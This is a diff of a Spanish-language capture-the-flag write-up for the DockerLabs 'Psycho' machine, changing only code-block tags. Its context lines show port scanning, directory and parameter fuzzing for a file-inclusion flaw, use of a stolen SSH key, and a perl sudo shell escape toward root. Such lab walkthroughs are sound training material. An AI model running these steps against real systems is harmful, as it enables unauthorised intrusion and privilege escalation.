@@ -21,16 +21,16 @@ Es ideal para reforzar conocimientos sobre análisis de puertos, fuzzing, técni
 
 
 ## DESPLIEGUE
-```python
+```bash
 bash auto_deploy.sh psycho.tar
 ```
 ![despliegue](/assets/img/DockerLabs/MachinePsycho/despliegue.png)
 
 ## RECONOCIMIENTO
-```python
+```bash
 nmap -p- -sS --min-rate 5000 -vvvv -n -Pn -sCV 172.17.0.2 -oN ports
 ```
-```ruby
+```bash
 # Nmap 7.94SVN scan initiated Sat Mar  1 20:14:56 2025 as: nmap -p- -sS --min-rate 5000 -vvvv -n -Pn -sCV -oN ports 172.17.0.2
 Nmap scan report for 172.17.0.2
 Host is up, received arp-response (0.000013s latency).
@@ -61,7 +61,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Podemos fijarnos que hay un mensaje en la parte izquiera final de la web, indicando un error, como si una solicitud se estuviera tramitando mal
 ya esto nos recuerda un poco a la Vulnerabilidad de LFI, realizaremos una fuerza bruta para descubrir directorios con gobuster
 
-```ruby
+```bash
 gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x html,txt,php,xml,csv,txt,html -t 20 -b 500,502,404
 ```
 ![gobuster](/assets/img/DockerLabs/MachinePsycho/gobuster.png)
@@ -71,7 +71,7 @@ Vemos que tenemos una carpetita `assets`, si sapeamos es una imagen, eh aplicado
 ![assets](/assets/img/DockerLabs/MachinePsycho/assets.png)
 
 index.php nos dirige a la misma web, entonces vamos a aplicar un Fuzzing para ver si descubrimos un parametro y explotar un posible LFI
-```ruby
+```bash
 wfuzz -c --hc=404,500 --hw=169 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u 'http://172.17.0.2/index.php?FUZZ=whoami'
 ```
 ![Wfuzz](/assets/img/DockerLabs/MachinePsycho/wfuzz.png)
@@ -89,21 +89,21 @@ extraemos el id_rsa y copiamos en un archivo que crearemos en nuestra maquina at
 
 ![permisos_id_rsa](/assets/img/DockerLabs/MachinePsycho/permisos_id_rsa.png)
 
-```ruby
+```bash
 ssh -i id_rsa vaxei@172.17.0.2
 ```
 ![login_vaxei](/assets/img/DockerLabs/MachinePsycho/login_vaxei.png)
 
 ## ESCALADA DE PRIVILEGIOS
 La manera mas sencilla hacer 
-```ruby
+```bash
 sudo -l
 ```
 si no, podemos aprovechar permisos SUID pero este no es el caso, podemos observar que el usuario Luisillo puede ejecutar `/usr/bin/perl`, es decir nos convertiremos primero en luisillo para luego escalar a root
 
 ![gtfobins](/assets/img/DockerLabs/MachinePsycho/gtfobins.png)
 
-```ruby
+```bash
 sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash";'
 ```
 ![luisillo](/assets/img/DockerLabs/MachinePsycho/luisillo.png)
@@ -126,7 +126,7 @@ ejecutamos el paw.py y hemos ganado acceso como root
 
 
 # ELIMINAR LA MAQUINA
-```shell
+```bash
 Ctrl + C
 ```
 
